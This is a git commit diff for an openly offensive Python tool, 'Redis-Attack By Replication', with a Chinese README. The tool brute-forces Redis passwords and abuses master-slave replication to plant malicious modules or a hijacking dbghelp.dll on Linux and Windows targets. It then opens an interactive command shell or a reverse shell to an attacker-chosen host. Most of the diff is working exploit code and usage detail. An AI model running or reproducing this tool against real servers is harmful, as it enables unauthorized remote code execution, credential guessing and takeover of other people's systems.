6ea9dd422f9229dddac5e253ea40779c74585d92
He <1035758070@qq.com>
2021-07-08 21:59:33 +0800

    0.6

--- README.md
+++ README.md
@@ -3,7 +3,8 @@
 Redis-Attack By Replication (通过主从复制攻击Redis)   
 
 - 攻击Linux下的Redis，可执行命令和反弹shell
-- 攻击Window x64下的Redis，可...执行calc  
+- 攻击Window x64下的Redis，可执行命令 
+
 本工具基于**Ridter**师傅的[**redis-rce**](https://github.com/Ridter/redis-rce) 进行修改。  
 
 ## 声明
@@ -17,16 +18,18 @@ Redis从2.8开始，就支持主从复制功能。
 **这就意味着我们可以将任意文件写入到目标Redis权限下的任意路径**。    
 
 ## 特点
-- 本工具利用这个Redis的脆弱性，对Linux下的redis进行module攻击，对Windows下的Redis进行dll劫持攻击。  
-- 本工具默认使用的恶意模块：exp.so，源码来自于：[**RedisModules-ExecuteCommand** ](https://github.com/puckiestyle/RedisModules-ExecuteCommand ), 该模块实现了执行单条命令和反弹shell的功能，你也可以编写自己的模块。  
-- 本工具默认使用的恶意dll：dbghelp.dll，是通过 [**DLLHijacker** ](https://github.com/kiwings/DLLHijacker )+ **win7x64下的dbghelp.dll** 编译生成的，该dll会执行calc，你可以编译自己的dbghelp.dll。
+- 本工具利用这个Redis的脆弱性，对Linux下的redis进行module攻击，对Windows下的Redis进行module攻击和dll劫持攻击。  
+- 本工具默认使用的Linux恶意模块：exp.so，源码来自于：[**RedisModules-ExecuteCommand** ](https://github.com/puckiestyle/RedisModules-ExecuteCommand ), 该模块实现了执行单条命令和反弹shell的功能，你也可以编写自己的模块。  
+- 本工具默认使用的Windows恶意模块：exp.dll，源码来自于：[**RedisModules-ExecuteCommand-for-Windows** ](https://github.com/0671/RedisModules-ExecuteCommand-for-Windows ), 该模块实现了执行命令的功能，你也可以编写自己的模块。  
+- 本工具默认使用的用于劫持的恶意dll：dbghelp.dll，是通过 [**DLLHijacker** ](https://github.com/kiwings/DLLHijacker )+ **Winx64下的dbghelp.dll**编译生成的，该dll会执行calc，你可以编译自己的dbghelp.dll。
 - 本工具有爆破功能，密码字典位于pwd.txt中。  
 - 本工具在攻击前会备份目标Redis的数据，在攻击结束后会进行恢复，使用的工具为[**redis-dump-go**](https://github.com/yannh/redis-dump-go )。默认是开启的，可以关闭。  
 
 ## 结构
 ```  
 │  dbghelp.dll 默认用于劫持Redis的dll
-│  exp.so 默认导入的Redis模块
+│  exp.dll 默认导入的Windows Redis模块
+│  exp.so 默认导入的Linux Redis模块
 │  pwd.txt 爆破字典
 │  rd.exe 用于保存Redis数据的程序
 │  README.md
@@ -49,23 +52,28 @@ optional arguments:
   -P LPORT, --lport LPORT
                         rogue server listen port, default 16379
   -wf WINFILE, --winfile WINFILE
-                        Dll Used to hijack redis, default dbghelp.dll
+                        Dll used to hijack redis, default dbghelp.dll
+  -wf2 WINFILE2, --winfile2 WINFILE2
+                        Redis Modules(win) to load, default exp.dll
   -lf LINUXFILE, --linuxfile LINUXFILE
-                        RedisModules to load, default exp.so
+                        Redis Modules(linux) to load, default exp.so
   -a AUTH, --auth AUTH  redis password
   --brute               If redis needs to verify the password, perform a brute force attack base in pwd.txt
   -i, --idontcare       don't care about the data on the target redis
   -v, --verbose         show more info
 ```
 
-![image-20210703203005715](phpto/RabR/image-20210703203005715.png)
+![image-20210708212712502](phpto/image-20210708212712502.png)
 
-![image-20210703202827200](phpto/RabR/image-20210703202827200.png)
+![image-20210708190457889](phpto/image-20210708190457889.png)
+
+![image-20210708213302932](phpto/image-20210708213302932.png)
 
 ## 进一步
 
-攻击Windows x64下的redis：  
-1）[DLLHijacker](https://github.com/kiwings/DLLHijacker) +目标redis的系统版本的dbghelp.dll， 生成vs项目。  
+劫持Windows x64下的dbghelp.dll的具体方法：  
+
+1）[DLLHijacker](https://github.com/kiwings/DLLHijacker) +目标Redis的系统版本的dbghelp.dll， 生成vs项目。  
 2）vs项目修改：   
 
 ```
@@ -74,8 +82,12 @@ optional arguments:
 3、修改活动解决方案为Realease，x64
 4、修改项目属性的sdk版本、平台工具集为本地vs可用的值
 ```
-3）编译生成dll，复制到本工具目录下。    
+3）编译生成恶意dbghelp.dll，复制到本工具目录下。    
 4）使用本工具执行攻击 。  
+
+## 时间线
+    2021.07.03 发布v0.5
+    2021.07.08 发布v0.6,增加了Windows模块攻击
 
 
 ## 感谢
--- redis-attack.py
+++ redis-attack.py
@@ -21,6 +21,7 @@ usage = R"""python redis-attack.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] 
 Example: python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 --brute
 """
 
+# Convert command arrays to RESP arrays 
 def mk_cmd_arr(arr):
     cmd = ""
     cmd += "*" + str(len(arr))
@@ -30,11 +31,11 @@ def mk_cmd_arr(arr):
     cmd += "\r\n"
     return cmd
 
-
+# Convert the Redis command to command array 
 def mk_cmd(raw_cmd):
     return mk_cmd_arr(raw_cmd.split(" "))
 
-
+# Receive data from SOCK 
 def din(sock, cnt):
     msg = sock.recv(cnt)
     if verbose:
@@ -48,7 +49,7 @@ def din(sock, cnt):
         res = re.sub(b'[^\x00-\x7f]', b'', msg)
     return res.decode()
 
-
+# Send data to SOCK 
 def dout(sock, msg):
     if type(msg) != bytes:
         msg = msg.encode()
@@ -61,11 +62,11 @@ def dout(sock, msg):
         else:
             print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))
 
-
+# Decoding the return result of the execution command of the interactive shell 
 def decode_shell_result(s):
     return "\n".join(s.split("\r\n")[1:-1])
 
-
+# This is the REDIS client 
 class Remote:
     def __init__(self, rhost, rport):
         self._host = rhost
@@ -73,30 +74,34 @@ class Remote:
         self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._sock.connect((self._host, self._port))
 
-
+    # send data 
     def send(self, msg):
         dout(self._sock, msg)
 
+    # Receive data 
     def recv(self, cnt=65535):
         return din(self._sock, cnt)
 
+    # Send the redis command and receive the return value 
     def do(self, cmd):
         self.send(mk_cmd(cmd))
         buf = self.recv()
         return buf
 
+    # Close the connection
     def close(self):
         self._sock.close()
 
+    # Send system commands and receive return values
     def shell_cmd(self, cmd):
         self.send(mk_cmd_arr(['system.exec', "{}".format(cmd)]))
         buf = self.recv()
         return buf
-
+    # Send a command to perform a reverse shell
     def reverse_shell(self, addr, port):
         self.send(mk_cmd("system.rev {} {}".format(addr, port)))
 
-
+# This is a Rogue Redis Server for transmitting malicious data in master-slave replication. 
 class RogueServer:
     def __init__(self, lhost, lport, remote, file):
         self._host = lhost
@@ -108,6 +113,7 @@ class RogueServer:
         self._sock.settimeout(15)
         self._sock.listen(10)
 
+    # Respond to the request of the slave, then transmit malicious data 
     def handle(self, data):
         resp = ""
         phase = 0
@@ -125,9 +131,10 @@ class RogueServer:
             phase = 3
         return resp, phase
 
+    # Close the connection
     def close(self):
         self._sock.close()
-
+    # Start listening, then perform file transfer under master-slave replication
     def exp(self):
         try:
             cli, addr = self._sock.accept()
@@ -142,13 +149,13 @@ class RogueServer:
                     break
         except Exception as e:
             print("\033[1;31;m[-]\033[0m Error: {}, exit".format(e))
-            cleanup(self._remote, self._file)
+            cleanup(self._remote, self._file) # When an error occurs, restore the configuration of the target Redis 
             exit(0)
         except KeyboardInterrupt:
-            print("[-] Exit..")
+            print("[-] User Quit..")
             exit(0)
 
-
+# Set up the host and IP of the reverse shell, then execute 
 def reverse(remote):
     print("[*] Open reverse shell...")
     addr = input("[*] Reverse server address: ")
@@ -157,7 +164,7 @@ def reverse(remote):
     print("\033[92m[+]\033[0m Reverse shell payload sent.")
     print("[*] Check at {}:{}".format(addr, port))
 
-
+# Set the command of interaction shell, then execute 
 def interact(remote):
     print("\033[92m[+]\033[0m Interactive shell open , use \"exit\" to exit...")
     try:
@@ -169,30 +176,40 @@ def interact(remote):
             r = remote.shell_cmd(cmd)
             if 'unknown command' in r:
                 print("\033[1;31;m[-]\033[0m Error:{} , check your module!".format(r.strip()))
-                return
+                # return
+                continue
             for l in decode_shell_result(r).split("\n"):
                 if l:
                     print(l)
     except KeyboardInterrupt:
         return
 
+# Clean malicious modules under Linux 
 def cleanup(remote, expfile):
-    # clean up
     print("[*] Clean up..")
     remote.do("CONFIG SET dbfilename dump.rdb")
     remote.shell_cmd("rm ./{}".format(expfile))
     remote.do("MODULE UNLOAD system")
     # remote.close()
 
+#  Overwrit the malicious module under Windows (because you can't delete the imported DLL) 
+def overwrite_winmodule(remote,rogue, expfile):
+    print("[*] Overwrite..")
+    global payload
+    remote.do("MODULE UNLOAD system")
+    payload = b"hello world"
+    rogue.exp()
+    sleep(2)
+    remote.do("SLAVEOF NO ONE")
+    
+# Print the remote IP and port 
 def printback(remote):
     back = remote._sock.getpeername()
     print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))
 
-
-def runserver(rhost, rport, lhost, lport):
-    # get expolit filename
-    # expfile = os.path.basename(filename)
-    # start exploit
+# Run attack program 
+def run(rhost, rport, lhost, lport):
+    # Brute force attack Redis 
     def bruteRedis():
         with open(pwdfile,'r')as f:
             pwd = f.readline()
@@ -207,27 +224,32 @@ def runserver(rhost, rport, lhost, lport):
         remote = Remote(rhost, rport)
         need_auth = False
         check = remote.do("AUTH {}".format(auth))
-        if "but no password is set" in check and auth != "gugugu":
-            print("\033[1;31;m[-]\033[0m No password required !")
-        elif "invalid password" in check:
-            need_auth = True
+        if "but no password is set" in check: # No need to verify password 
+            if auth != "gugugu": # The command line has set a password
+                print("\033[1;31;m[-]\033[0m No password required !")
+            else:
+                pass
+        elif "invalid password" in check: # wrong password 
+            need_auth = True # Set the sign that needs to verify the password 
             if brute:
                 state,pwd=bruteRedis()
                 if state:
-                    print("\033[92m[+]\033[0m Successfully found password: {}".format(pwd))
+                    print("\033[92m[+]\033[0m Successfully found password: \033[92m{}\033[0m".format(pwd))
                 else:
-                    print("\033[1;31;m[-]\033[0m No found password.")
+                    print("\033[1;31;40m[-]\033[0m No found password.")
                     return
             else:
                 if auth != "gugugu":
-                    print("\033[1;31;m[-]\033[0m Wrong password !")
+                    print("\033[1;31;40m[-]\033[0m Wrong password !")
                     return
                 else:
-                    print("\033[1;31;m[-]\033[0m Need password.")
+                    print("\033[1;31;40m[-]\033[0m Need password.")
                     return
-        else:
+        else: # Password correct 
             pwd = auth
             need_auth = True
+
+        # Get the version of Redis, the system, the number of system bits 
         info = remote.do("INFO")
         redis_version = info[info.find('redis_version:')+len("redis_version:"):info.find('\r\n',info.find('redis_version:'))]
         redis_os = info[info.find('os:')+len("os:"):info.find('\r\n',info.find('os:'))]
@@ -235,46 +257,69 @@ def runserver(rhost, rport, lhost, lport):
         print("[*] Redis version: {}".format(redis_version))
         print("[*] Redis os: {}".format(redis_os))
         print("[*] Redis arch_bits: {}".format(redis_arch_bits))
+
+        # Depending on the Redis version and the system, determine the file transferred in the master-slave replication 
         if 'Linux' in redis_os and int(redis_version[0])>=4:
-            print("[√] Can use master-slave replication to import the RedisModule to attack the redis")
+            print("[√] Can use master-slave replication to load the RedisModule to attack the redis")
             if os.path.exists(linuxfilename) == False:
-                print("\033[1;31;m[-]\033[0m Where you module? ")
+                print("\033[1;31;m[-]\033[0m Where you module(linux)? ")
                 exit(0)
             expfile = os.path.basename(linuxfilename)
         elif 'Windows' in redis_os:
             print("[√] Can use master-slave replication to hijack dbghelp.dll to attack the redis")
-            if os.path.exists(linuxfilename) == False:
-                print("\033[1;31;m[-]\033[0m Where you dll? ")
+            if os.path.exists(winfilename[0]) == False:
+                print("\033[1;31;40m[-]\033[0m Where you dbghelp.dll? ")
                 exit(0)
-            expfile = os.path.basename(winfilename)
+            if int(redis_version[0])>=4:
+                print("[√] Can use master-slave replication to load the RedisModule to attack the redis")
+                if os.path.exists(winfilename[1]) == False:
+                    print("\033[1;31;40m[-]\033[0m Where you module(win)? ")
+                    exit(0)
+            choice = input("\033[92m[+]\033[0m What do u want ? [h]ijack dbghelp.dll or [l]oad module or [e]xit: ")
+            if choice.startswith("h"):
+                expfile = os.path.basename(winfilename[0])
+            if choice.startswith("l"):
+                expfile = os.path.basename(winfilename[1])
+            if choice.startswith("e"):
+                print("[*] User Quit..")
+                return
         else:
             print("[#] Please use other tools to attack the redis")
             return
         global payload,idontcare
+        # Read malicious files that need to be transmitted 
         payload = open(expfile, "rb").read()
         print("[*] Setting filename")
         print("[*] Sending SLAVEOF command to server")
+        # Set the target redis as a slave
         remote.do("SLAVEOF {} {}".format(lhost, lport))
         printback(remote)
         if idontcare == False:
+            # If you don't set an `idontcare` flag, data protection is performed 
             print("[*] Saveing dbdata")
             if need_auth:
                 os.environ["REDISDUMPGO_AUTH"] = pwd
+            # Keep Redis data as command form via rd.exe 
             os.system("rd.exe -host {} -port {} -s -output commands > {}".format(rhost, rport, "_redis-db.dump"))
+        # Set the dbfilename of the target Redis 
         remote.do("CONFIG SET dbfilename {}".format(expfile))
         printback(remote)
+        # Sleep is necessary, because the target redis accepts commands and processing commands to have certain time 
         sleep(2)
         print("[*] Start listening on {}:{}".format(lhost, lport))
+        # Run the Rogue Redis server and transfer data 
         rogue = RogueServer(lhost, lport, remote, expfile)
         print("[*] Tring to run payload")
         rogue.exp()
         sleep(2)
+        
         if 'Linux' in redis_os:
-            remote.do("MODULE LOAD ./{}".format(expfile))
+            # If it is Linux, load a malicious module 
+            remote.do("MODULE LOAD ./{}".format(expfile)) 
             remote.do("SLAVEOF NO ONE")
-            print("[*] Closing rogue server...\n")
+            print("[*] Closing rogue server...")
             rogue.close()
-            # Operations here
+            # Module operation, interacting shell or reverse shell 
             choice = input("\033[92m[+]\033[0m What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: ")
             if choice.startswith("i"):
                 interact(remote)
@@ -282,23 +327,35 @@ def runserver(rhost, rport, lhost, lport):
                 reverse(remote)
             elif choice.startswith("e"):
                 pass
-            cleanup(remote, expfile)
-        else:
-            remote.do("BGSAVE")
+            cleanup(remote, expfile) # Clean up module file 
+        elif 'Windows' in redis_os:
+            # If it is Windows, according to the original selection, the DLL hijack or load a malicious module is performed. 
+            if choice.startswith("h"):
+                remote.do("BGSAVE") # Hijack dbghelp.dll
+            else:
+                remote.do("MODULE LOAD ./{}".format(expfile)) # load a malicious module
+                interact(remote) # reverse shell 
+                rogue.close()
+                # Need to restart the Rogue Redis server, using the original server may result in failure to connect
+                rogue = RogueServer(lhost, lport, remote, expfile) # 
+                overwrite_winmodule(remote, rogue, expfile) # Overwrit the malicious module
             remote.do("SLAVEOF NO ONE")
             remote.do("CONFIG SET dbfilename dump.rdb")
-            print("[*] Closing rogue server...\n")
+            print("[*] Closing rogue server...")
             rogue.close()
+
         if idontcare == False:
             print("[*] Refuseing dbdata ",end='')
             for line in open("_redis-db.dump"):
                 print('.',end='')
                 line = line.strip()
+                # Restore the Redis data in the form of command. 
                 check = remote.do(line)
             sleep(2)
             remote.do("SAVE")
             os.remove("_redis-db.dump")
         remote.close()
+        print()
     except Exception as e:
         print("\033[1;31;m[-]\033[0m Error found : {} \n[*] Exit..".format(e))
 
@@ -310,7 +367,8 @@ def main():
     parser.add_argument("-L", "--lhost", dest="lhost", type=str,help="rogue server ip", required=True)
     parser.add_argument("-P", "--lport", dest="lport", type=int,help="rogue server listen port, default 16379", default=16379)
     parser.add_argument("-wf", "--winfile", type=str, help="Dll Used to hijack redis, default dbghelp.dll", default='dbghelp.dll')
-    parser.add_argument("-lf", "--linuxfile", type=str, help="RedisModules to load, default exp.so", default='exp.so')
+    parser.add_argument("-wf2", "--winfile2", type=str, help="RedisModules(win) to load, default exp.dll", default='exp.dll')
+    parser.add_argument("-lf", "--linuxfile", type=str, help="RedisModules(linux) to load, default exp.so", default='exp.so')
     parser.add_argument("-a", "--auth", dest="auth", type=str, help="redis password", default='gugugu')
     parser.add_argument("--brute", action="store_true", help="If redis needs to verify the password, perform a brute force attack base in pwd.txt",default=False)
     parser.add_argument("-i", "--idontcare", action="store_true", help="don't care about the data on the target redis", default=False)
@@ -323,10 +381,10 @@ def main():
     brute = options.brute
     pwdfile = "pwd.txt"
     linuxfilename = options.linuxfile
-    winfilename = options.winfile
+    winfilename = [options.winfile,options.winfile2]
     idontcare = options.idontcare
     verbose = options.verbose
-    runserver(options.rhost, options.rport, options.lhost, options.lport)
+    run(options.rhost, options.rport, options.lhost, options.lport)
 
 
 if __name__ == '__main__':
